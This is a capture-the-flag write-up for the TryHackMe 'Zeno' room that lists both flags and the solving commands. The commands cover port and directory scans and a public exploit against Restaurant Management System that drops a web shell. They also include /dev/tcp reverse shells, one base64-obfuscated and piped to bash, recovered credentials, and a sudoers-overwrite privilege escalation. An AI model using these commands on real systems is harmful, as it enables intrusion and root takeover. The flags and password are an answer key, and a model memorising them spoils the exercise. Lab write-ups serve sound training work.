# <div align="center">[Zeno](https://tryhackme.com/r/room/zeno)</div>
<div align="center">Do you have the same patience as the great stoic philosopher Zeno? Try it out!</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/b7ce2ee8-5239-4098-b407-3df142e4d9a9" height="200"></img>
</div>


## Task 1. Start up the VM
Perform a penetration test against a vulnerable machine. Your end-goal is to become the root user and retrieve the two flags:

```/home/{{user}}/user.txt```
```/root/root.txt```
The flags are always in the same format, where XYZ is a MD5 hash: THM{XYZ}

The machine can take some time to fully boot up, so please be patient! :)

The VM is booted up!
```
No Need
```

## Task 2. Get both flags
Good luck!
### Content of user.txt
```
THM{070cab2c9dc622e5d25c0709f6cb0510}
```
### Content of root.txt
```
THM{b187ce4b85232599ca72708ebde71791}
```
### Gained access as root user.
```
No answer needed
```

## Obtaining User.txt
```
nmap -sSCV -p- <IP>
gobuster dir -u http://<IP>:12340/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
searchsploit Restaurant Management System
python3 47520.py http://<IP>:12340/rms/
http://<IP>:12340/rms/images/reverse-shell.php/?cmd=id
sh -i >& /dev/tcp/ <my_own_IP>/4444 0>&1
echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNC43OC84MCAwPiYxCg==|base64 -d|bash
nc -nvlp 4444
cat config.php
cat /etc/fstab
# username: zeno
# password: FrobjoodAdkoonceanJa
ssh edward@<IP>
ls
cat user.txt
```
## Root.txt
```
sudo -l
/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
sudo /usr/sbin/reboot
sudo su
cat /root/root.txt
```
